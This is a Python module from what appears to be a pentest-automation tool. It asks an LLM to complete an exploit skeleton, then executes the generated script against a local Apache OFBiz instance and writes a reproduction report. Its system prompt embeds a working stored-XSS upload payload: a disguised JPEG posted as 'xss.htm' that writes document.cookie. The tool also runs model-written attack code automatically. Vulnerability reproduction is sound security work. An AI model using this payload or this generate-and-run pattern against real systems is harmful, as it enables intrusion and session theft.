"""
Vulnerability Reproducer

Architecture:
  1. parse_vuln_context() — same analysis a human pentester does first:
       extract attack_type, endpoints, params, upload details
  2. build_exploit_skeleton() — pre-fills login + verification (always correct)
       LLM only fills Step 2: payload construction + exploit HTTP call
  3. Execute the stitched script, capture output
  4. Extract IMPACT EVIDENCE block and build Markdown report
"""

import re
import subprocess

from core.llm.client import OllamaConnectionError
from core.reproduction.poc_generator import _patch_ssl_verify
from core.codebase.vuln_parser import parse_vuln_context, build_exploit_skeleton


def reproduce_vulnerability(client, vuln_description, code_context, analysis):
    """
    Generates, executes, and reports a vulnerability reproduction test.
    """
    print("[*] Parsing vulnerability context...")
    ctx = parse_vuln_context(vuln_description, analysis)
    print(f"  -> Attack type : {ctx['attack_type'].upper()}")
    print(f"  -> Entry points: {ctx['endpoints'][:3]}")
    print(f"  -> Parameters  : {ctx['query_params'][:5]}")
    print(f"  -> Is upload   : {ctx['is_upload']}")

    skeleton = build_exploit_skeleton(ctx)
    print("[*] Exploit skeleton pre-built. Asking LLM to fill Step 2 only...")

    system_prompt = """You are a penetration tester. You will be given a Python exploit skeleton
with Step 1 (login) and Step 3 (verify) already written correctly.
Your ONLY job is to write Step 2: the payload construction and exploit HTTP call.

ABSOLUTE RULES:
- Output ONLY a complete runnable ```python code block
- Keep Step 1 and Step 3 EXACTLY as given — do not modify them
- Step 2 builds the payload IN MEMORY using bytes literals — NEVER use open() on a file
- NEVER import Java packages (com.*, org.*, java.*)
- ONLY use: requests, urllib3, io, os, sys, re, struct, time

CORRECT way to build and upload a file payload:
  jpeg_header = bytes([0xFF,0xD8,0xFF,0xE0,0x00,0x10]) + b"A"*500
  # ALWAYS use double-quoted bytes for HTML/JS payloads (single quotes break Python if payload contains apostrophes)
  html_tail   = b"\\n<script>document.write(document.cookie)</script>\\n"
  payload_bytes = jpeg_header + html_tail          # in-memory, no disk file
  files = {"file": ("xss.htm", payload_bytes, "image/jpeg")}
  r = session.post(f"{BASE}/catalog/control/UploadProductImage",
                   files=files, params={"productId": product_id, "up_load_file_type": "original"})
"""

    prompt = f"""## Vulnerability
{vuln_description}

## Attack Context (pre-parsed)
- Attack type : {ctx['attack_type'].upper()}
- Summary     : {ctx['attack_summary']}
- Upload to   : {ctx['endpoints']}
- Filename    : {ctx.get('upload_filename', 'exploit.bin')}  <- this controls saved extension
- Content-Type: {ctx.get('upload_content_type', 'image/jpeg')}
- Parameters  : {ctx['query_params']}

## Relevant Source Code (understand HOW the server processes the upload/request)
{code_context[:5000]}

## Skeleton (Step 1 and Step 3 are DONE — only fill Step 2)
```python
{skeleton}
```

Fill in Step 2 of the skeleton above.
Replace the `# [LLM: insert ...]` comment with working Python code that:
1. Builds the payload bytes IN MEMORY
2. Sends the exploit HTTP request with correct parameters
3. Prints what was sent

Return the COMPLETE script (all steps) in a single ```python block.
"""

    try:
        response = client.analyze_vulnerability(prompt, system_prompt=system_prompt)
    except OllamaConnectionError as e:
        return _error_report(vuln_description, f"Ollama error: {e}")

    # Extract code block
    clean = re.sub(r'<think>.*?</think>', '', response, flags=re.DOTALL).strip()
    if len(clean) < 50:
        clean = response

    code = None
    for pattern in [
        r'```python\s*\n(.*?)\n\s*```',
        r'```\s*\n(.*?)\n\s*```',
    ]:
        match = re.search(pattern, clean, re.DOTALL)
        if not match:
            match = re.search(pattern, response, re.DOTALL)
        if match:
            code = match.group(1).strip()
            break

    if not code:
        # LLM didn't give a code block — use skeleton with stub Step 2
        print("[!] LLM didn't return a code block. Using skeleton with stub Step 2.")
        code = skeleton.replace(
            "# [LLM: insert payload bytes construction + upload + any prerequisite steps here]",
            "print('[!] LLM failed to generate Step 2 — manual exploitation required')"
        )

    # Safety: reject Java imports
    java_import = re.search(r'^\s*(?:from|import)\s+(?:com|org|java|javax)\.', code, re.MULTILINE)
    if java_import:
        print(f"[!] Java import detected — falling back to skeleton stub")
        code = skeleton.replace(
            "# [LLM: insert payload bytes construction + upload + any prerequisite steps here]",
            "print('[!] LLM generated Java imports — Step 2 needs manual implementation')"
        )

    # Safety: compile() check — catches LLM-introduced syntax errors
    try:
        compile(code, "repro_test.py", "exec")
    except SyntaxError as e:
        print(f"[!] LLM generated syntactically invalid Python: {e}")
        print("[!] Falling back to skeleton with stub Step 2")
        code = skeleton.replace(
            "# [LLM: insert payload bytes construction + upload + any prerequisite steps here]",
            f"print('[!] LLM Step 2 had syntax error: {str(e).replace(chr(39), chr(34))} — manual implementation needed')"
        )

    code = _patch_ssl_verify(code)

    test_file = "repro_test.py"
    with open(test_file, "w", encoding="utf-8") as f:
        f.write(code)
    print(f"[OK] Test saved as {test_file}")

    # Execute
    print("[*] Running reproduction test against OFBiz...")
    try:
        result = subprocess.run(
            ["python3", "-u", test_file],
            capture_output=True, text=True, timeout=120
        )
        stdout = result.stdout
        stderr = result.stderr
        exit_code = result.returncode
        print(stdout)
    except subprocess.TimeoutExpired:
        stdout = ""
        stderr = "Test timed out after 120 seconds"
        exit_code = -1

    if stderr:
        print(f"[stderr] {stderr[:800]}")

    # Verdict
    upper_out = stdout.upper()
    if "RESULT: VULNERABLE" in upper_out:
        verdict = "VULNERABLE - Confirmed"
        verdict_icon = "RED"
    elif "RESULT: NOT VULNERABLE" in upper_out:
        verdict = "NOT VULNERABLE"
        verdict_icon = "GREEN"
    else:
        verdict = "INCONCLUSIVE - Review output manually"
        verdict_icon = "YELLOW"

    # Extract IMPACT EVIDENCE block
    impact_block = ""
    if "=== IMPACT EVIDENCE ===" in stdout:
        impact_start = stdout.index("=== IMPACT EVIDENCE ===")
        impact_raw = stdout[impact_start:]
        result_match = re.search(r'\nRESULT:', impact_raw)
        impact_block = impact_raw[:result_match.start()].strip() if result_match else impact_raw.strip()

    report = f"""# Vulnerability Reproduction Report

## Verdict: [{verdict_icon}] {verdict}

## Vulnerability
{vuln_description}

## Parsed Attack Context
| Field | Value |
|---|---|
| Attack Type | {ctx['attack_type'].upper()} |
| Summary | {ctx['attack_summary']} |
| Entry Endpoints | {', '.join(ctx['endpoints'][:3]) or 'N/A'} |
| Parameters | {', '.join(ctx['query_params'][:6]) or 'N/A'} |
| File Upload | {ctx['is_upload']} |

## Impact Evidence
{impact_block if impact_block else "_No structured impact block - see full output below._"}

## Reproduction Test Script
```python
{code}
```

## Full Execution Output
- **Exit Code:** {exit_code}

```
{stdout if stdout else "(empty)"}
```

### Errors
```
{stderr if stderr else "None"}
```

## Analysis Summary
{analysis[:1000]}{"..." if len(analysis) > 1000 else ""}
"""
    return report


def _error_report(vuln_description, error_msg):
    return f"""# Vulnerability Reproduction Report

## Verdict: [FAILED]

## Vulnerability
{vuln_description}

## Error
{error_msg}

## Recommendation
- Check that Ollama is running
- Check that OFBiz is accessible at https://localhost:8443
- Re-run Phase 1 analysis if needed
"""
